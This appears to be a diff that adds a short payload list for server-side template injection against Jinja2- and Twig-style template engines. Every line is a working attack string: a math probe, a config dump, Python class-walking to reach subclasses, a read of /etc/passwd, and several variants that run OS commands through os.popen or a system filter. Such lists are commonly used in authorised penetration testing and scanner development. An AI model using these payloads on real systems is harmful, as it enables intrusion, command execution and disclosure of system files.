@@ -1,0 +1,8 @@
+{{7*7}}
+{{config.items()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+{{['id']|filter('system')}}
+
